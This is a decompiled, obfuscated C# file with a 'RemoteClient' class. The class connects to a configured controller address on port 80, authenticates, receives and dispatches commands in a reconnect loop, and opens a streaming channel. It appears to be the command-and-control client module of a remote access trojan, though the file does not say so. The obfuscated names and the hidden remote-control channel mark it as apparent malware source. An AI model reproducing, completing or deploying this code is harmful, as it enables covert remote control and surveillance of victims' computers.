using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using RemoteClient.Consumers;
using RemoteClient.Mappers;
using RemoteClient.Pakcets.Client;
using RemoteClient.Polices;
using RemoteClient.Schemes;
using sdfsdf.Queues;

namespace RemoteClient
{
	// Token: 0x02000024 RID: 36
	public class RemoteClient : IDisposable
	{
		// Token: 0x060000A2 RID: 162 RVA: 0x00004778 File Offset: 0x00002978
		public RemoteClient(Socket _socket)
		{
			InvocationProcessPolicy.CompareError();
			this.m_Watcher = Encoding.ASCII.GetBytes("<EOF>");
			this.buf = new byte[1024];
			base..ctor();
			this.tcpSocket = _socket;
			this.clientState = true;
			new Thread(new ThreadStart(this.ForgotMapper)).Start();
			this.tcpSocket.BeginReceive(this.buf, 0, this.buf.Length, SocketFlags.None, new AsyncCallback(this.RecieveCallback), this.tcpSocket);
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00004808 File Offset: 0x00002A08
		private void ForgotMapper()
		{
			while (this.clientState)
			{
				try
				{
					bool flag = this.tcpSocket.Poll(1000, SelectMode.SelectRead);
					bool flag2 = this.tcpSocket.Available == 0;
					if (flag && flag2)
					{
						this.clientState = false;
						this.Dispose();
						return;
					}
					if (!Program.needReconnect)
					{
						return;
					}
					Thread.Sleep(500);
				}
				catch
				{
					if (!Program.needReconnect)
					{
						return;
					}
				}
			}
			this.Dispose();
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00004894 File Offset: 0x00002A94
		public void Auth()
		{
			Packets.Auth auth = new Packets.Auth();
			this.id = auth.id;
			auth.Execute(Product.tests);
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x000048C0 File Offset: 0x00002AC0
		public void AuthStream()
		{
			for (;;)
			{
				try
				{
					Packets.Auth auth = new Packets.Auth();
					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					if (MapperProductSchema.mapper == "")
					{
						socket.Connect(new IPEndPoint(IPAddress.Parse(MapperProductSchema.m_Context), 80));
					}
					else
					{
						socket.Connect(new IPEndPoint(IPAddress.Parse(MapperProductSchema.mapper), 80));
					}
					this.tcpSocket.NoDelay = true;
					List<byte> list = auth.ToList();
					list.AddRange(this.m_Watcher);
					socket.Send(list.ToArray());
					socket.ReceiveTimeout = 7000;
					socket.Receive(new byte[1]);
					if (this.streamClass != null)
					{
						this.streamClass.Dispose();
						this.streamClass = null;
					}
					this.streamClass = new Streaming(socket);
					break;
				}
				catch (Exception ex)
				{
					SchemaMapper.ReflectContext("Error on Socket conection " + ex.ToString());
				}
			}
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x000049C0 File Offset: 0x00002BC0
		public void Send(Packets.IPacket packet)
		{
			try
			{
				object obj = new object();
				object obj2 = obj;
				lock (obj2)
				{
					if (this.clientState && packet != null)
					{
						try
						{
							List<byte> list = packet.ToList();
							list.AddRange(this.m_Watcher);
							this.tcpSocket.Send(list.ToArray(), list.Count, SocketFlags.None);
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
				this.Dispose();
			}
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00004A64 File Offset: 0x00002C64
		public void RecieveCallback(IAsyncResult ar)
		{
			try
			{
				if (this.clientState)
				{
					Socket socket = (Socket)ar.AsyncState;
					try
					{
						if (socket.EndReceive(ar) > 0)
						{
							Customer.InstantiateMapper(this, Method.DestroyMapper(this.buf));
						}
					}
					catch
					{
					}
					this.EnableMapper();
					socket.BeginReceive(this.buf, 0, this.buf.Length, SocketFlags.None, new AsyncCallback(this.RecieveCallback), this.tcpSocket);
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x000025B0 File Offset: 0x000007B0
		private void EnableMapper()
		{
			this.tcpSocket.Send(new byte[]
			{
				228
			});
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x00004AF8 File Offset: 0x00002CF8
		public void Dispose()
		{
			object broadcaster = RemoteClient.m_Broadcaster;
			object obj = broadcaster;
			lock (obj)
			{
				try
				{
					this.clientState = false;
					this.tcpSocket.Shutdown(SocketShutdown.Both);
					this.tcpSocket.Close();
					this.tcpSocket.Dispose();
					try
					{
						this.streamClass.StopStream = true;
						Thread.Sleep(1000);
						if (this.streamClass.tcpStream != null)
						{
							this.streamClass.tcpStream.Shutdown(SocketShutdown.Both);
							this.streamClass.tcpStream.Close();
							this.streamClass.tcpStream.Dispose();
							this.streamClass.tcpStream = null;
						}
						this.tcpSocket = null;
					}
					catch
					{
					}
					this.buf = null;
					this.id = null;
					GC.Collect();
				}
				catch
				{
				}
			}
		}

		// Token: 0x060000AA RID: 170 RVA: 0x000025CC File Offset: 0x000007CC
		// Note: this type is marked as 'beforefieldinit'.
		static RemoteClient()
		{
			InvocationProcessPolicy.CompareError();
			RemoteClient.m_Broadcaster = new object();
		}

		// Token: 0x04000076 RID: 118
		private static object m_Broadcaster;

		// Token: 0x04000077 RID: 119
		private byte[] m_Watcher;

		// Token: 0x04000078 RID: 120
		public byte[] buf;

		// Token: 0x04000079 RID: 121
		public Socket tcpSocket;

		// Token: 0x0400007A RID: 122
		public Streaming streamClass;

		// Token: 0x0400007B RID: 123
		public byte[] id;

		// Token: 0x0400007C RID: 124
		public bool clientState;
	}
}
